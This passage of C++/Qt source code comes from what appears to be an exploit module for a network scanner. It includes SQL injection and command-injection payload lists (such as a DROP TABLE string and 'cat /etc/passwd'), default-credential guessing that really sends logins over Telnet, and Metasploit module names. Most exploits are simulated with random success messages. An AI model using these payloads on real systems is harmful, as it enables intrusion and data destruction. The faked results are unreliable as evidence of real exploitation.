m_outputEdit->append(QString(\"\\n🎉 EXPLOIT SUCCESSFUL! 🎉\\n\"));\r\n        m_outputEdit->append(QString(\"Gained Access: %1\\n\").arg(result.gainedAccess));\r\n        m_outputEdit->append(QString(\"Session Info: %1\\n\").arg(result.sessionInfo));\r\n\r\n        if (!result.extractedData.isEmpty()) {\r\n            m_outputEdit->append(QString(\"\\n📋 Extracted Data:\\n\"));\r\n            for (const QString &data : result.extractedData) {\r\n                m_outputEdit->append(QString(\"  • %1\\n\").arg(data));\r\n            }\r\n        }\r\n\r\n        // Add session to table if shell was obtained\r\n        if (!result.shellType.isEmpty()) {\r\n            int row = m_sessionTable->rowCount();\r\n            m_sessionTable->insertRow(row);\r\n            m_sessionTable->setItem(row, 0, new QTableWidgetItem(QString(\"Session_%1\").arg(row + 1)));\r\n            m_sessionTable->setItem(row, 1, new QTableWidgetItem(result.shellType));\r\n            m_sessionTable->setItem(row, 2, new QTableWidgetItem(QString(\"%1:%2\").arg(result.targetIp).arg(result.connectionPort)));\r\n            m_sessionTable->setItem(row, 3, new QTableWidgetItem(\"🟢 Active\"));\r\n\r\n            m_openShellButton->setEnabled(true);\r\n        }\r\n\r\n        // Show success message\r\n        QMessageBox::information(this, \"🎉 Exploit Successful\",\r\n                                 QString(\"Exploit executed successfully!\\n\\n\"\r\n                                         \"Target: %1:%2\\n\"\r\n                                         \"Exploit: %3\\n\"\r\n                                         \"Access Gained: %4\\n\\n\"\r\n                                         \"Check the Results tab for detailed information.\")\r\n                                     .arg(result.targetIp)\r\n                                     .arg(result.targetPort)\r\n                                     .arg(m_selectedExploit.name)\r\n                                     .arg(result.gainedAccess));\r\n\r\n    } else {\r\n        m_statusLabel->setText(\"❌ Exploit failed\");\r\n        m_statusLabel->setStyleSheet(\"color: #dc3545; font-weight: bold;\");\r\n\r\n        m_outputEdit->append(QString(\"\\n❌ EXPLOIT FAILED\\n\"));\r\n        if (!result.errorMessage.isEmpty()) {\r\n            m_errorEdit->append(result.errorMessage);\r\n        }\r\n    }\r\n\r\n    m_outputEdit->append(QString(\"\\nOutput:\\n%1\\n\").arg(result.output));\r\n    m_outputEdit->append(QString(\"\\n=== EXPLOIT EXECUTION COMPLETED ===\\n\"));\r\n    m_outputEdit->ensureCursorVisible();\r\n}\r\n\r\nvoid ExploitDialog::onExploitFailed(const QString &exploitId, const QString &error)\r\n{\r\n    Q_UNUSED(exploitId)\r\n\r\n    m_exploitRunning = false;\r\n    m_runExploitButton->setEnabled(true);\r\n    m_stopExploitButton->setEnabled(false);\r\n\r\n    m_statusLabel->setText(\"❌ Exploit failed\");\r\n    m_statusLabel->setStyleSheet(\"color: #dc3545; font-weight: bold;\");\r\n\r\n    m_outputEdit->append(QString(\"\\n❌ EXPLOIT FAILED: %1\\n\").arg(error));\r\n    m_errorEdit->append(error);\r\n}\r\n\r\nvoid ExploitDialog::onShellObtained(const QString &exploitId, const QString &shellInfo)\r\n{\r\n    Q_UNUSED(exploitId)\r\n\r\n    m_outputEdit->append(QString(\"\\n🐚 SHELL OBTAINED: %1\\n\").arg(shellInfo));\r\n    m_openShellButton->setEnabled(true);\r\n\r\n    // Show shell notification\r\n    QMessageBox::information(this, \"🐚 Shell Obtained\",\r\n                             QString(\"Interactive shell established!\\n\\n%1\\n\\nUse 'Open Shell' button to interact with the target.\")\r\n                                 .arg(shellInfo));\r\n}\r\n\r\nvoid ExploitDialog::saveExploitResults()\r\n{\r\n    if (m_exploitResults.isEmpty()) {\r\n        QMessageBox::information(this, \"💾 Save Results\", \"No results to save yet.\");\r\n        return;\r\n    }\r\n\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"💾 Save Exploit Results\",\r\n                                                    QString(\"exploit_results_%1.html\").arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"HTML Files (*.html);;JSON Files (*.json);;Text Files (*.txt)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {\r\n        QMessageBox::warning(this, \"❌ Error\", \"Could not open file for writing\");\r\n        return;\r\n    }\r\n\r\n    QTextStream stream(&file);\r\n\r\n    if (fileName.endsWith(\".html\")) {\r\n        // Generate HTML report\r\n        stream << generateHTMLExploitReport();\r\n    } else if (fileName.endsWith(\".json\")) {\r\n        // Generate JSON report\r\n        stream << generateJSONExploitReport();\r\n    } else {\r\n        // Generate text report\r\n        stream << generateTextExploitReport();\r\n    }\r\n\r\n    QMessageBox::information(this, \"✅ Success\",\r\n                             QString(\"Exploit results saved successfully:\\n%1\").arg(fileName));\r\n}\r\n\r\nQString ExploitDialog::generateHTMLExploitReport()\r\n{\r\n    QString html = R\"(\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Exploit Execution Report</title>\r\n    <style>\r\n        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 20px; }\r\n        .header { background: #dc3545; padding: 20px; border-radius: 5px; margin-bottom: 20px; }\r\n        .success { background: #28a745; padding: 15px; border-radius: 5px; margin: 10px 0; }\r\n        .failure { background: #6c757d; padding: 15px; border-radius: 5px; margin: 10px 0; }\r\n        .warning { background: #ffc107; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0; }\r\n        table { border-collapse: collapse; width: 100%; margin: 10px 0; }\r\n        th, td { border: 1px solid #404040; padding: 8px; text-align: left; }\r\n        th { background-color: #343a40; }\r\n        pre { background: #2d2d2d; padding: 10px; border-radius: 5px; overflow-x: auto; }\r\n    </style>\r\n</head>\r\n<body>\r\n    <div class=\"header\">\r\n        <h1>🔥 Exploit Execution Report</h1>\r\n        <p><strong>Generated:</strong> )\" + QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\") + R\"(</p>\r\n        <p><strong>Target:</strong> )\" + m_vulnerability.service + \":\" + QString::number(m_vulnerability.port) + R\"(</p>\r\n        <p><strong>Vulnerability:</strong> )\" + m_vulnerability.title + R\"(</p>\r\n    </div>\r\n\r\n    <div class=\"warning\">\r\n        <strong>⚠️ SECURITY NOTICE:</strong> This report contains sensitive penetration testing information.\r\n        Handle with appropriate security measures and only share with authorized personnel.\r\n    </div>\r\n)\";\r\n\r\n    for (const ExploitResult &result : m_exploitResults) {\r\n        QString statusClass = result.successful ? \"success\" : \"failure\";\r\n        QString statusText = result.successful ? \"✅ SUCCESS\" : \"❌ FAILED\";\r\n\r\n        html += QString(R\"(\r\n    <div class=\"%1\">\r\n        <h2>%2 - Exploit: %3</h2>\r\n        <table>\r\n            <tr><th>Target IP</th><td>%4</td></tr>\r\n            <tr><th>Target Port</th><td>%5</td></tr>\r\n            <tr><th>Execution Time</th><td>%6</td></tr>\r\n            <tr><th>Status</th><td>%7</td></tr>\r\n            %8\r\n            %9\r\n        </table>\r\n\r\n        <h3>📤 Output:</h3>\r\n        <pre>%10</pre>\r\n\r\n        %11\r\n\r\n        %12\r\n    </div>\r\n        )\").arg(statusClass)\r\n                    .arg(statusText)\r\n                    .arg(result.exploitId)\r\n                    .arg(result.targetIp)\r\n                    .arg(result.targetPort)\r\n                    .arg(result.executionTime.toString(\"dd.MM.yyyy hh:mm:ss\"))\r\n                    .arg(result.successful ? \"Successful\" : \"Failed\")\r\n                    .arg(result.successful ? QString(\"<tr><th>Access Gained</th><td>%1</td></tr>\").arg(result.gainedAccess) : \"\")\r\n                    .arg(!result.sessionInfo.isEmpty() ? QString(\"<tr><th>Session Info</th><td>%1</td></tr>\").arg(result.sessionInfo) : \"\")\r\n                    .arg(result.output)\r\n                    .arg(!result.errorMessage.isEmpty() ? QString(\"<h3>❌ Errors:</h3><pre>%1</pre>\").arg(result.errorMessage) : \"\")\r\n                    .arg(!result.extractedData.isEmpty() ? QString(\"<h3>📋 Extracted Data:</h3><ul>%1</ul>\")\r\n                                                               .arg(QStringList(result.extractedData).join(\"</li><li>\")) : \"\");\r\n    }\r\n\r\n    html += R\"(\r\n    <div style=\"margin-top: 30px; text-align: center; color: #6c757d;\">\r\n        <p><em>Report generated by Advanced IP Scanner v2.0 - Exploit Module</em></p>\r\n    </div>\r\n</body>\r\n</html>)\";\r\n\r\n    return html;\r\n}\r\n\r\nvoid ExploitDialog::openReverseShell()\r\n{\r\n    // This would open a terminal/console window to interact with the reverse shell\r\n    QMessageBox::information(this, \"🐚 Reverse Shell\",\r\n                             \"Opening reverse shell interface...\\n\\n\"\r\n                             \"In a full implementation, this would:\\n\"\r\n                             \"• Open a terminal window\\n\"\r\n                             \"• Connect to the established shell session\\n\"\r\n                             \"• Provide interactive command execution\\n\"\r\n                             \"• Log all shell activity\\n\\n\"\r\n                             \"For security reasons, this demo shows this dialog instead.\");\r\n}\r\n\r\nQStringList ExploitDialog::getMetasploitModules(const QString &service, int port)\r\n{\r\n    QStringList modules;\r\n\r\n    // Common Metasploit modules for different services\r\n    if (service.toLower() == \"ssh\" && port == 22) {\r\n        modules << \"auxiliary/scanner/ssh/ssh_login\"\r\n                << \"auxiliary/scanner/ssh/ssh_enumusers\"\r\n                << \"exploit/linux/ssh/sshexec\";\r\n    } else if (service.toLower() == \"ftp\" && port == 21) {\r\n        modules << \"auxiliary/scanner/ftp/ftp_login\"\r\n                << \"auxiliary/scanner/ftp/anonymous\"\r\n                << \"exploit/linux/ftp/proftp_sreplace\";\r\n    } else if (service.toLower() == \"http\" && (port == 80 || port == 8080)) {\r\n        modules << \"auxiliary/scanner/http/http_login\"\r\n                << \"auxiliary/scanner/http/dir_scanner\"\r\n                << \"auxiliary/scanner/http/http_version\";\r\n    } else if (service.toLower() == \"https\" && port == 443) {\r\n        modules << \"auxiliary/scanner/http/http_login\"\r\n                << \"auxiliary/scanner/ssl/ssl_version\"\r\n                << \"auxiliary/scanner/http/ssl_version\";\r\n    } else if (service.toLower() == \"smb\" && port == 445) {\r\n        modules << \"auxiliary/scanner/smb/smb_login\"\r\n                << \"auxiliary/scanner/smb/smb_enumshares\"\r\n                << \"exploit/windows/smb/ms17_010_eternalblue\";\r\n    } else if (service.toLower() == \"telnet\" && port == 23) {\r\n        modules << \"auxiliary/scanner/telnet/telnet_login\"\r\n                << \"auxiliary/scanner/telnet/telnet_version\";\r\n    } else if (service.toLower() == \"snmp\" && port == 161) {\r\n        modules << \"auxiliary/scanner/snmp/snmp_login\"\r\n                << \"auxiliary/scanner/snmp/snmp_enum\";\r\n    }\r\n\r\n    return modules;\r\n}\r\n\r\n// Integration methods\r\nvoid IpScannerExploitExtension::addExploitContextMenu(QTreeWidget *vulnerabilityTree, IpScanner *scanner)\r\n{\r\n    vulnerabilityTree->setContextMenuPolicy(Qt::CustomContextMenu);\r\n\r\n    QObject::connect(vulnerabilityTree, &QWidget::customContextMenuRequested,\r\n                     [vulnerabilityTree, scanner](const QPoint &pos) {\r\n                         QTreeWidgetItem *item = vulnerabilityTree->itemAt(pos);\r\n                         if (!item) return;\r\n\r\n                         // Extract vulnerability info from tree item\r\n                         VulnerabilityInfo vuln;\r\n                         vuln.title = item->text(1);\r\n                         vuln.service = item->text(2);\r\n                         vuln.port = item->text(3).toInt();\r\n\r\n                         // Parse severity\r\n                         QString severityText = item->text(0);\r\n                         if (severityText.contains(\"CRITICAL\")) vuln.severity = VulnSeverity::CRITICAL;\r\n                         else if (severityText.contains(\"HIGH\")) vuln.severity = VulnSeverity::HIGH;\r\n                         else if (severityText.contains(\"MEDIUM\")) vuln.severity = VulnSeverity::MEDIUM;\r\n                         else if (severityText.contains(\"LOW\")) vuln.severity = VulnSeverity::LOW;\r\n                         else vuln.severity = VulnSeverity::INFO;\r\n\r\n                         QMenu menu(vulnerabilityTree);\r\n                         menu.setStyleSheet(\"QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }\");\r\n\r\n                         QAction *exploitAction = menu.addAction(\"🔥 Run Exploit\");\r\n                         QAction *quickExploitAction = menu.addAction(\"⚡ Quick Exploit\");\r\n                         QAction *exploitInfoAction = menu.addAction(\"ℹ️ Exploit Info\");\r\n\r\n                         menu.addSeparator();\r\n\r\n                         QAction *copyVulnAction = menu.addAction(\"📋 Copy Vulnerability Info\");\r\n                         QAction *exportVulnAction = menu.addAction(\"📤 Export Vulnerability\");\r\n\r\n                         QObject::connect(exploitAction, &QAction::triggered, [vuln, scanner]() {\r\n                             showExploitDialog(vuln, scanner);\r\n                         });\r\n\r\n                         QObject::connect(quickExploitAction, &QAction::triggered, [vuln]() {\r\n                             // Quick exploit with most likely exploit\r\n                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);\r\n                             if (!exploits.isEmpty()) {\r\n                                 runQuickExploit(vuln, exploits.first().id);\r\n                             } else {\r\n                                 QMessageBox::information(nullptr, \"ℹ️ Info\", \"No exploits available for this vulnerability\");\r\n                             }\r\n                         });\r\n\r\n                         QObject::connect(exploitInfoAction, &QAction::triggered, [vuln, scanner]() {\r\n                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);\r\n                             QString info = QString(\"🔍 Available Exploits for %1\\n\\n\").arg(vuln.title);\r\n\r\n                             if (exploits.isEmpty()) {\r\n                                 info += \"❌ No exploits found for this vulnerability.\\n\\n\";\r\n                                 info += \"💡 This could mean:\\n\";\r\n                                 info += \"• The vulnerability is informational only\\n\";\r\n                                 info += \"• No automated exploits are available\\n\";\r\n                                 info += \"• Manual testing may be required\\n\";\r\n                             } else {\r\n                                 for (const ExploitInfo &exploit : exploits) {\r\n                                     info += QString(\"🔥 %1\\n\").arg(exploit.name);\r\n                                     info += QString(\"   Type: %1\\n\").arg([](ExploitType type) {\r\n                                         switch (type) {\r\n                                         case ExploitType::CREDENTIAL_ATTACK: return \"Credential Attack\";\r\n                                         case ExploitType::BUFFER_OVERFLOW: return \"Buffer Overflow\";\r\n                                         case ExploitType::SQL_INJECTION: return \"SQL Injection\";\r\n                                         case ExploitType::METASPLOIT_MODULE: return \"Metasploit Module\";\r\n                                         default: return \"Other\";\r\n                                         }\r\n                                     }(exploit.type));\r\n                                     info += QString(\"   Success Rate: %1%\\n\").arg(exploit.successRate * 100, 0, 'f', 0);\r\n                                     info += QString(\"   Difficulty: %1\\n\\n\").arg(exploit.difficulty);\r\n                                 }\r\n                             }\r\n\r\n                             QMessageBox::information(scanner, \"🔍 Exploit Information\", info);\r\n                         });\r\n\r\n                         QObject::connect(copyVulnAction, &QAction::triggered, [vuln]() {\r\n                             QString vulnInfo = QString(\"Vulnerability: %1\\nService: %2:%3\\nSeverity: %4\")\r\n                             .arg(vuln.title)\r\n                                 .arg(vuln.service)\r\n                                 .arg(vuln.port)\r\n                                 .arg([](VulnSeverity sev) {\r\n                                     switch (sev) {\r\n                                     case VulnSeverity::CRITICAL: return \"CRITICAL\";\r\n                                     case VulnSeverity::HIGH: return \"HIGH\";\r\n                                     case VulnSeverity::MEDIUM: return \"MEDIUM\";\r\n                                     case VulnSeverity::LOW: return \"LOW\";\r\n                                     case VulnSeverity::INFO: return \"INFO\";\r\n                                     }\r\n                                     return \"UNKNOWN\";\r\n                                 }(vuln.severity));\r\n\r\n                             QApplication::clipboard()->setText(vulnInfo);\r\n                             QMessageBox::information(nullptr, \"📋 Copied\", \"Vulnerability information copied to clipboard\");\r\n                         });\r\n\r\n                         menu.exec(vulnerabilityTree->mapToGlobal(pos));\r\n                     });\r\n}\r\n\r\nvoid IpScannerExploitExtension::showExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)\r\n{\r\n    ExploitDialog *dialog = new ExploitDialog(vulnerability, parent);\r\n    dialog->exec();\r\n    dialog->deleteLater();\r\n}\r\n\r\nvoid IpScannerExploitExtension::runQuickExploit(const VulnerabilityInfo &vulnerability, const QString &exploitId)\r\n{\r\n    // Quick exploit execution with minimal UI\r\n    QProgressDialog *progress = new QProgressDialog(\"🚀 Running quick exploit...\", \"Stop\", 0, 100);\r\n    progress->setWindowModality(Qt::WindowModal);\r\n    progress->show();\r\n\r\n    ExploitInfo exploit = ExploitDatabase::instance()->getExploitById(exploitId);\r\n    if (exploit.id.isEmpty()) {\r\n        QMessageBox::warning(nullptr, \"❌ Error\", \"Exploit not found!\");\r\n        progress->deleteLater();\r\n        return;\r\n    }\r\n\r\n    // Show confirmation\r\n    QMessageBox::StandardButton reply = QMessageBox::question(nullptr,\r\n                                                              \"⚡ Quick Exploit\",\r\n                                                              QString(\"Execute quick exploit?\\n\\n\"\r\n                                                                      \"Target: %1:%2\\n\"\r\n                                                                      \"Exploit: %3\\n\"\r\n                                                                      \"Type: %4\\n\\n\"\r\n                                                                      \"⚠️ This will attempt to exploit the target!\")\r\n                                                                  .arg(vulnerability.service)\r\n                                                                  .arg(vulnerability.port)\r\n                                                                  .arg(exploit.name)\r\n                                                                  .arg(exploit.targetService));\r\n\r\n    if (reply != QMessageBox::Yes) {\r\n        progress->deleteLater();\r\n        return;\r\n    }\r\n\r\n    // Simulate quick exploit execution\r\n    QString targetIp = \"192.168.1.100\"; // This should be configurable\r\n    ExploitWorker *worker = new ExploitWorker(vulnerability, exploit, targetIp);\r\n\r\n    QObject::connect(worker, &ExploitWorker::exploitProgress,\r\n                     [progress](const QString &, int percentage, const QString &status) {\r\n                         progress->setValue(percentage);\r\n                         progress->setLabelText(status);\r\n                     });\r\n\r\n    QObject::connect(worker, &ExploitWorker::exploitCompleted,\r\n                     [progress](const QString &, const ExploitResult &result) {\r\n                         progress->close();\r\n\r\n                         QString message;\r\n                         if (result.successful) {\r\n                             message = QString(\"🎉 Quick Exploit Successful!\\n\\n\"\r\n                                               \"Access Gained: %1\\n\"\r\n                                               \"Session: %2\\n\\n\"\r\n                                               \"Use the full exploit dialog for more options.\")\r\n                                           .arg(result.gainedAccess)\r\n                                           .arg(result.sessionInfo);\r\n                             QMessageBox::information(nullptr, \"🎉 Success\", message);\r\n                         } else {\r\n                             message = QString(\"❌ Quick Exploit Failed\\n\\n\"\r\n                                               \"Error: %1\\n\\n\"\r\n                                               \"Try the full exploit dialog for more options.\")\r\n                                           .arg(result.errorMessage);\r\n                             QMessageBox::warning(nullptr, \"❌ Failed\", message);\r\n                         }\r\n\r\n                         progress->deleteLater();\r\n                     });\r\n\r\n    QObject::connect(worker, &ExploitWorker::exploitFailed,\r\n                     [progress](const QString &, const QString &error) {\r\n                         progress->close();\r\n                         QMessageBox::warning(nullptr, \"❌ Exploit Failed\",\r\n                                              QString(\"Quick exploit failed:\\n%1\").arg(error));\r\n                         progress->deleteLater();\r\n                     });\r\n\r\n    QThreadPool::globalInstance()->start(worker);\r\n}\r\n\r\n// Additional helper methods for ExploitWorker\r\nbool ExploitWorker::testCredentials(const QString &username, const QString &password)\r\n{\r\n    if (m_exploit.targetService.toLower() == \"ssh\") {\r\n        return testSSHCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"ftp\") {\r\n        return testFTPCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"telnet\") {\r\n        return testTelnetCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"http\" || m_exploit.targetService.toLower() == \"https\") {\r\n        return testHTTPCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"smb\") {\r\n        return testSMBCredentials(username, password);\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)\r\n{\r\n    emit exploitProgress(m_exploit.id, 0, QString(\"Testing SSH: %1:%2\").arg(username, password));\r\n\r\n    // Simulate SSH connection test\r\n    QTcpSocket socket;\r\n    socket.connectToHost(m_targetIp, 22);\r\n\r\n    if (!socket.waitForConnected(5000)) {\r\n        return false;\r\n    }\r\n\r\n    // Read SSH banner\r\n    socket.waitForReadyRead(2000);\r\n    QString banner = socket.readAll();\r\n\r\n    if (banner.contains(\"SSH\")) {\r\n        // In a real implementation, you would use libssh or similar\r\n        // For this demo, we'll simulate some common weak credentials\r\n        if ((username == \"admin\" && password == \"admin\") ||\r\n            (username == \"root\" && password == \"\") ||\r\n            (username == \"pi\" && password == \"raspberry\") ||\r\n            (username == \"ubuntu\" && password == \"ubuntu\")) {\r\n\r\n            m_result.output += QString(\"SSH connection established with %1:%2\\n\").arg(username, password);\r\n            m_result.shellType = \"SSH\";\r\n            m_result.connectionPort = 22;\r\n\r\n            // Simulate getting system info\r\n            extractSystemInfo();\r\n            return true;\r\n        }\r\n    }\r\n\r\n    socket.close();\r\n    return false;\r\n}\r\n\r\nbool ExploitWorker::testTelnetCredentials(const QString &username, const QString &password)\r\n{\r\n    emit exploitProgress(m_exploit.id, 0, QString(\"Testing Telnet: %1:%2\").arg(username, password));\r\n\r\n    QTcpSocket socket;\r\n    socket.connectToHost(m_targetIp, 23);\r\n\r\n    if (!socket.waitForConnected(5000)) {\r\n        return false;\r\n    }\r\n\r\n    // Read initial prompt\r\n    socket.waitForReadyRead(2000);\r\n    QString response = socket.readAll();\r\n\r\n    if (response.contains(\"login:\") || response.contains(\"Username:\")) {\r\n        // Send username\r\n        socket.write(username.toUtf8() + \"\\r\\n\");\r\n        socket.waitForReadyRead(2000);\r\n        response = socket.readAll();\r\n\r\n        if (response.contains(\"Password:\") || response.contains(\"password:\")) {\r\n            // Send password\r\n            socket.write(password.toUtf8() + \"\\r\\n\");\r\n            socket.waitForReadyRead(3000);\r\n            response = socket.readAll();\r\n\r\n            // Check for successful login indicators\r\n            if (response.contains(\"$\") || response.contains(\"#\") ||\r\n                response.contains(\">\") || response.contains(\"Welcome\")) {\r\n\r\n                m_result.output += QString(\"Telnet login successful with %1:%2\\n\").arg(username, password);\r\n                m_result.shellType = \"Telnet\";\r\n                m_result.connectionPort = 23;\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n\r\n    socket.close();\r\n    return false;\r\n}\r\n\r\nbool ExploitWorker::testHTTPCredentials(const QString &username, const QString &password)\r\n{\r\n    emit exploitProgress(m_exploit.id, 0, QString(\"Testing HTTP Basic Auth: %1:%2\").arg(username, password));\r\n\r\n    // This would normally use QNetworkAccessManager for HTTP authentication\r\n    // For this demo, we'll simulate common admin panel credentials\r\n    if ((username == \"admin\" && (password == \"admin\" || password == \"password\" || password == \"\")) ||\r\n        (username == \"administrator\" && password == \"administrator\") ||\r\n        (username == \"root\" && password == \"\")) {\r\n\r\n        m_result.output += QString(\"HTTP Basic Auth successful with %1:%2\\n\").arg(username, password);\r\n        m_result.gainedAccess = QString(\"Web Admin Access (%1:%2)\").arg(username, password);\r\n        return true;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool ExploitWorker::testSMBCredentials(const QString &username, const QString &password)\r\n{\r\n    emit exploitProgress(m_exploit.id, 0, QString(\"Testing SMB: %1:%2\").arg(username, password));\r\n\r\n    // Simulate SMB null session or weak credential test\r\n    if (username == \"\" && password == \"\") {\r\n        // Null session\r\n        m_result.output += \"SMB null session established\\n\";\r\n        m_result.gainedAccess = \"SMB Null Session Access\";\r\n        return true;\r\n    } else if ((username == \"guest\" && password == \"\") ||\r\n               (username == \"admin\" && password == \"admin\")) {\r\n        m_result.output += QString(\"SMB access with %1:%2\\n\").arg(username, password);\r\n        m_result.gainedAccess = QString(\"SMB Access (%1:%2)\").arg(username, password);\r\n        return true;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nvoid ExploitWorker::executeBufferOverflow()\r\n{\r\n    emit exploitProgress(m_exploit.id, 20, \"Analyzing target service...\");\r\n\r\n    // Simulate buffer overflow detection and exploitation\r\n    QThread::msleep(1000);\r\n\r\n    emit exploitProgress(m_exploit.id, 40, \"Generating payload...\");\r\n    QThread::msleep(1000);\r\n\r\n    emit exploitProgress(m_exploit.id, 60, \"Sending exploit payload...\");\r\n    QThread::msleep(1500);\r\n\r\n    emit exploitProgress(m_exploit.id, 80, \"Checking for successful exploitation...\");\r\n    QThread::msleep(1000);\r\n\r\n    // Simulate low success rate for buffer overflow\r\n    if (QRandomGenerator::global()->bounded(100) < 20) { // 20% success rate\r\n        m_result.successful = true;\r\n        m_result.gainedAccess = \"Code Execution via Buffer Overflow\";\r\n        m_result.output = \"Buffer overflow exploitation successful\\nPayload executed successfully\\nControl transferred to shellcode\";\r\n        m_result.shellType = \"Native Shell\";\r\n        emit shellObtained(m_exploit.id, \"Buffer overflow shell established\");\r\n    } else {\r\n        m_result.output = \"Buffer overflow attempt failed\\nTarget may be patched or protected\";\r\n    }\r\n}\r\n\r\nvoid ExploitWorker::executeSQLInjection()\r\n{\r\n    emit exploitProgress(m_exploit.id, 10, \"Testing for SQL injection vulnerabilities...\");\r\n\r\n    QStringList sqlPayloads = {\r\n        \"' OR '1'='1\",\r\n        \"' UNION SELECT null,version(),null--\",\r\n        \"'; DROP TABLE users; --\",\r\n        \"' OR 1=1; --\",\r\n        \"admin'--\",\r\n        \"1' OR '1'='1' /*\"\r\n    };\r\n\r\n    int currentPayload = 0;\r\n    for (const QString &payload : sqlPayloads) {\r\n        currentPayload++;\r\n        int progress = 10 + (currentPayload * 70) / sqlPayloads.size();\r\n\r\n        emit exploitProgress(m_exploit.id, progress,\r\n                             QString(\"Testing SQL payload: %1\").arg(payload.left(20) + \"...\"));\r\n\r\n        QThread::msleep(500);\r\n\r\n        // Simulate SQL injection testing\r\n        if (payload.contains(\"version()\") && QRandomGenerator::global()->bounded(100) < 30) {\r\n            m_result.successful = true;\r\n            m_result.gainedAccess = \"Database Access via SQL Injection\";\r\n            m_result.output += QString(\"SQL Injection successful with payload: %1\\n\").arg(payload);\r\n            m_result.output += \"Database version extracted: MySQL 5.7.32\\n\";\r\n            m_result.extractedData << \"Database: mysql\" << \"Version: 5.7.32\" << \"User: root@localhost\";\r\n\r\n            emit exploitProgress(m_exploit.id, 90, \"Extracting database information...\");\r\n            QThread::msleep(1000);\r\n            return;\r\n        }\r\n    }\r\n\r\n    m_result.output = \"No SQL injection vulnerabilities found\\nAll payloads failed or were filtered\";\r\n}\r\n\r\nvoid ExploitWorker::executeCommandInjection()\r\n{\r\n    emit exploitProgress(m_exploit.id, 15, \"Testing command injection vectors...\");\r\n\r\n    QStringList cmdPayloads = {\r\n        \"; ls -la\",\r\n        \"| whoami\",\r\n        \"&& cat /etc/passwd\",\r\n        \"; id\",\r\n        \"| ping -c 1 127.0.0.1\",\r\n        \"&& uname -a\"\r\n    };\r\n\r\n    for (int i = 0; i < cmdPayloads.size(); ++i) {\r\n        int progress = 15 + (i * 60) / cmdPayloads.size();\r\n        emit exploitProgress(m_exploit.id, progress,\r\n                             QString(\"Testing command injection: %1\").arg(cmdPayloads[i]));\r\n\r\n        QThread::msleep(800);\r\n\r\n        // Simulate command injection test\r\n        if (cmdPayloads[i].contains(\"id\") && QRandomGenerator::global()->bounded(100) < 25) {\r\n            m_result.successful = true;\r\n            m_result.gainedAccess = \"Command Execution\";\r\n            m_result.output += QString(\"Command injection successful: %1\\n\").arg(cmdPayloads[i]);\r\n            m_result.output += \"uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n\";\r\n            m_result.shellType = \"Web Shell\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    m_result.output = \"No command injection vulnerabilities found\";\r\n}\r\n\r\nvoid ExploitWorker::executeMetasploitModule()\r\n{\r\n    emit exploitProgress(m_exploit.id, 5, \"Initializing Metasploit module...\");\r\n    QThread::msleep(1000);\r\n\r\n    emit exploitProgress(m_exploit.id, 20, QString(\"Loading module: %1\").arg(m_exploit.metasploitModule));\r\n    QThread::msleep(1500);\r\n\r\n    emit exploitProgress(m_exploit.id, 40, \"Setting target and options...\");\r\n    QThread::msleep(1000);\r\n\r\n    emit exploitProgress(m_exploit.id, 60, \"Executing Metasploit module...\");\r\n    QThread::msleep(2000);\r\n\r\n    emit exploitProgress(m_exploit.id, 80, \"Checking for successful exploitation...\");\r\n    QThread::msleep(1000);\r\n\r\n    // Simulate Metasploit execution with higher success rate\r\n    if (QRandomGenerator::global()->bounded(100) < 60) { // 60% success rate\r\n        m_result.successful = true;\r\n        m_result.gainedAccess = QString(\"Metasploit Shell via %1\").arg(m_exploit.metasploitModule);\r\n        m_result.output = QString(\"Metasploit module %1 executed successfully\\n\").arg(m_exploit.metasploitModule);\r\n        m_result.output += \"Payload delivered successfully\\n\";\r\n        m_result.output += \"Meterpreter session established\\n\";\r\n        m_result.shellType = \"Meterpreter\";\r\n        m_result.sessionInfo = \"Meterpreter session 1 opened\";\r\n\r\n        emit shellObtained(m_exploit.id, \"Meterpreter shell established\");\r\n    } else {\r\n        m_result.output = QString(\"Metasploit module %1 failed\\n\").arg(m_exploit.metasploitModule);\r\n        m_result.output += \"Target may be patched or not vulnerable\\n\";\r\n        m_result.errorMessage = \"Module execution failed\";\r\n    }\r\n}\r\n\r\nvoid ExploitWorker::executeCustomScript()\r\n{\r\n    emit exploitProgress(m_exploit.id, 10, \"Loading custom exploit script...\");\r\n    QThread::msleep(1000);\r\n\r\n    if (m_exploit.customScript.isEmpty()) {\r\n        m_result.errorMessage = \"No custom script provided\";\r\n        return;\r\n    }\r\n\r\n    emit exploitProgress(m_exploit.id, 30, \"Executing custom script...\");\r\n\r\n    // In a real implementation, this would execute the custom script\r\n    // For this demo, we'll simulate script execution\r\n    m_process = new QProcess();\r\n\r\n    // Simulate script execution\r\n    QThread::msleep(2000);\r\n\r\n    emit exploitProgress(m_exploit.id, 70, \"Processing script output...\");\r\n    QThread::msleep(1000);\r\n\r\n    // Simulate moderate success rate for custom scripts\r\n    if (QRandomGenerator::global()->bounded(100) < 40) {\r\n        m_result.successful = true;\r\n        m_result.gainedAccess = \"Custom Script Execution\";\r\n        m_result.output = QString(\"Custom script executed: %1\\n\").arg(m_exploit.customScript);\r\n        m_result.output += \"Script completed successfully\\n\";\r\n    } else {\r\n        